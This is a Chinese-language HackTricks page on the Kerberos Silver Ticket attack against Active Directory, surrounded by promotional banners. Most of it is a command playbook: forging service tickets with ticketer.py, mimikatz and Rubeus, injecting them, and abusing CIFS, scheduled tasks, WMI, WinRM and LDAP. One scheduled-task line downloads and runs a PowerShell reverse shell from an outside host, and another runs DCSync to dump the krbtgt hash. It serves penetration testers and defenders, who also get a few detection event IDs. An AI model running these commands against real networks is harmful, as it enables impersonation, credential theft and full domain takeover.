# Silver Ticket

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**赏金提示**：**注册**Intigriti，这是一家由黑客创建的高级**赏金平台**！今天加入我们，开始赚取高达\*\*$100,000\*\*的赏金！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)

{% embed url="https://go.intigriti.com/hacktricks" %}

## 银票据

**银票据**攻击涉及利用Active Directory（AD）环境中的服务票据。该方法依赖于**获取服务帐户（例如计算机帐户）的NTLM哈希**，以伪造票据授予服务（TGS）票据。借助这个伪造的票据，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用AES密钥来伪造票据更安全且更不易被检测。

对于票据制作，根据操作系统使用不同的工具：

### 在Linux

```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### 在Windows上

```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS服务被强调为访问受害者文件系统的常见目标，但其他服务如HOST和RPCSS也可以被利用来执行任务和WMI查询。

## 可用服务

| 服务类型                  | 服务银票                                                             |
| --------------------- | ---------------------------------------------------------------- |
| WMI                   | <p>HOST</p><p>RPCSS</p>                                          |
| PowerShell远程          | <p>HOST</p><p>HTTP</p><p>根据操作系统不同还有：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                 | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p>                |
| 计划任务                  | HOST                                                             |
| Windows文件共享，也包括psexec | CIFS                                                             |
| LDAP操作，包括DCSync       | LDAP                                                             |
| Windows远程服务器管理工具      | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                               |
| 黄金票证                  | krbtgt                                                           |

使用**Rubeus**，您可以使用以下参数请求所有这些票证：

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### 银票事件ID

* 4624: 帐户登录
* 4634: 帐户注销
* 4672: 管理员登录

## 滥用服务票证

在以下示例中，假设通过模拟管理员帐户检索了票证。

### CIFS

有了这张票，您就可以通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被公开），并通过执行类似以下操作将文件复制到远程文件系统的某个位置：

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

### 主机

有了这个权限，您可以在远程计算机中生成计划任务并执行任意命令：

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### 主机 + RPCSS

使用这些票据，您可以在受害系统中执行 WMI：

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

在以下页面查找有关**wmiexec的更多信息**：

{% content-ref url="../lateral-movement/wmicexec.md" %}
[wmicexec.md](../lateral-movement/wmicexec.md)
{% endcontent-ref %}

### 主机 + WSMAN (WINRM)

通过计算机上的winrm访问，您可以**访问它**，甚至获取PowerShell：

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

### LDAP

拥有这个权限后，您可以使用**DCSync**来转储域控制器数据库：

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**了解更多关于DCSync**请查看以下页面：

## 参考资料

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**漏洞赏金提示**：**注册**Intigriti，一个由黑客创建的高级**漏洞赏金平台**！立即加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达\*\*$100,000\*\*的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>从零开始成为AWS黑客大师，使用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
